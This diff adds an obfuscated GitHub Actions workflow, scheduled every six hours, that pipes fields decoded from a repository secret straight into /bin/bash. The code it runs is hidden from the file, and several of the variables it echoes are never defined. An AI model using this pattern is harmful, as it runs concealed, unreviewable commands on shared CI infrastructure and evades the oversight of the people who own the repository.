@@ -1,0 +1,23 @@
+name: shaozihuawan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shaozihuawan
+        env:
+          veh9: ${{ secrets.veh9 }}
+        run: |
+          echo $veh9 | jq -r .zq4275 | /bin/bash
+          echo $q19 | jq -r .dezbh7137 | /bin/bash
+          echo $pzrrc0 | jq -r .g44 | /bin/bash
+          echo $wtpe5117 | jq -r .gyi88022 | /bin/bash
+          echo $llx2820 | jq -r .pzv43869 | /bin/bash
+          echo $xq99 | jq -r .m34 | /bin/bash
+          echo $wpnv6 | jq -r .y3483 | /bin/bash
+
